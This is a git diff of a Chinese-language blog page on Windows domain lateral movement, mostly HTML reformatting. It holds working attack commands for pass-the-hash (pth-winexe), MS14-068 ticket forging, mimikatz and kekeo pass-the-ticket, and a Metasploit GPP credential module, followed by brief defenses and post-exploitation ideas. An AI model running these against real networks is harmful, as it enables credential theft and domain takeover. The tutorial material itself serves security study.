@@ -795,8 +795,15 @@ use exploit/windows/smb/psexec_psh
 
 pth-winexe -U administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.11 cmd.exe
 </code></pre>
-<p>![](<a href="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203225415.png" target="_blank" rel="noopener">https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203225415.png</a></p>
-<h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass-The-Ticket"></a>Pass-The-Ticket</h2><p>ptt攻击的部分就不是简单的ntlm认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：<em>MS14-068</em>,<em>Golden ticket</em>,<em>SILVER TICKET</em>.<br>之前介绍了Kerberos协议具体工作方法，在域中，简要介绍一下：</p>
+<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203225415.png" alt=""></p>
+<h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass-The-Ticket"></a>Pass-The-Ticket</h2><p>引用自<a href="[http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/](http://xnianq.cn/2018/10/16/域渗透之横向移动/">原文</a></p>
+<p>ptt攻击的部分就不是简单的ntlm认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：</p>
+<ul>
+<li>MS14-068</li>
+<li>Golden ticket</li>
+<li>SILVER TICKET</li>
+</ul>
+<p>之前介绍了Kerberos协议具体工作方法，在域中，简要介绍一下：</p>
 <ul>
 <li>客户机将明文密码进行ntlm哈希,然后和时间戳一起加密(使用krbtgt密码hash作为密钥)，发送给kdc（域控）,kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)</li>
 <li>将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中tgt数据</li>
@@ -808,7 +815,7 @@ pth-winexe -U administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D0069
 </blockquote>
 </li>
 </ul>
-<p>这里不得不说walkerfuz表哥写的这篇分析文章：<a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/56081.html</a> 最详细的分析，没有之一，向表哥学习！<br>我用最简单的语言表达一下:</p>
+<p>这里不得不说walkerfuz表哥写的这篇分析文章：<a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/56081.html</a> 最详细的分析，没有之一，向表哥学习！我用最简单的语言表达一下:</p>
 <pre class=" language-bash"><code class="language-bash">windows域中使用kerberos协议过程中，为了让SS服务器判断Client是否有权限访问服务，引入了PAC机制。构造PAC也是这个漏洞的根本。
 1. 在请求AS时，将require_PAC设置成False。
 2. 在请求TGS时，构造PAC，然后使用MD5签名（PAC尾部的签名算法可以任意指定），PAC并没有放在TGT中发送，而是在请求包的其他位置（但是还是可以解析）。
@@ -816,26 +823,35 @@ pth-winexe -U administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D0069
 </code></pre>
 <p>利用过程：<br>1.whoami/user 得到普通域用户的sid</p>
 <p>2.执行payload生成ccache:</p>
-<pre><code>`MS14-068.exe -u yifan@test.local -s S-1-5-21-4173655609-916892889-516531421-1108 -d dc-01.test.local -p A100b200`
-</code></pre><p>3.使用mimikatz注入凭据:</p>
-<pre><code>kerberos::purge #清空当前机器存在的凭证
+<pre class=" language-bash"><code class="language-bash">MS14-068.exe -u yifan@test.local -s S-1-5-21-4173655609-916892889-516531421-1108 -d dc-01.test.local -p A100b200
+</code></pre>
+<p>3.使用mimikatz注入凭据:</p>
+<pre class=" language-bash"><code class="language-bash">kerberos::purge <span class="token comment" spellcheck="true">#清空当前机器存在的凭证</span>
 kerberos::ptc y:\downloads\TGT_yifan@test.local.ccache
-</code></pre><p>显示Injecting ticket : OK就表示注入成功了～<br>4.查看注入是否成功并且登录域控：</p>
+</code></pre>
+<p>显示Injecting ticket : OK就表示注入成功了～</p>
+<p>4.查看注入是否成功并且登录域控：</p>
 <p>发现已经将凭证注入进去了～下面可以使用net use进行登录，或者使用psexec,wmi等方法进行远程执行命令。注意，这里登录时，要使用机器名，不要使用IP，否则没办法攻击成功。</p>
-<p>考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket</p>
-<p>Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo，下载地址：</p>
-<p><a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></p>
-<p>参数实例：</p>
+<p>考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket。Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo，下载<a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">地址</a>。参数实例：</p>
 <pre class=" language-bash"><code class="language-bash">kekeo <span class="token string">"tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1"</span>
 </code></pre>
-<p>执行后生成票据<a href="mailto:`TGT_test1@TEST.LOCA" target="_blank" rel="noopener">`TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a>`</p>
+<p>执行后生成票据</p>
+<pre class=" language-bash"><code class="language-bash">TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi
+</code></pre>
 <p>接下来导入票据：</p>
 <pre class=" language-bash"><code class="language-bash">kekeo <span class="token string">"kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi"</span>
 </code></pre>
 <h1 id="五、防御思路"><a href="#五、防御思路" class="headerlink" title="五、防御思路"></a>五、防御思路</h1><p>结合攻击方法，总结防御思路如下：<br>检查特殊文件.scf 和 desktop.ini，避免被添加UNC路径<br>如无特殊需要，建议配置防火墙规则禁止139和445端口</p>
-<h1 id="六、后渗透思路拓展"><a href="#六、后渗透思路拓展" class="headerlink" title="六、后渗透思路拓展"></a>六、后渗透思路拓展</h1><p>内网欺骗劫持<br>钓鱼文件<br>后门命令<br>拿下一台文件服务器后，在上面创建图标、desktop.ini、link、url等</p>
-<p><a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">pass the hash with RDP</a></p>
-<p>获取域控</p>
+<h1 id="六、后渗透思路拓展"><a href="#六、后渗透思路拓展" class="headerlink" title="六、后渗透思路拓展"></a>六、后渗透思路拓展</h1><ul>
+<li>内网欺骗劫持</li>
+<li>钓鱼文件</li>
+<li>后门命令</li>
+<li>拿下一台文件服务器后，在上面创建图标、desktop.ini、link、url等</li>
+<li><p><a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">pass the hash with RDP</a></p>
+</li>
+<li><p>获取域控</p>
+</li>
+</ul>
 <pre class=" language-bash"><code class="language-bash">msf<span class="token operator">></span> run post/windows/gather/credentials/gpp
 </code></pre>
 <p><strong>参考链接</strong></p>
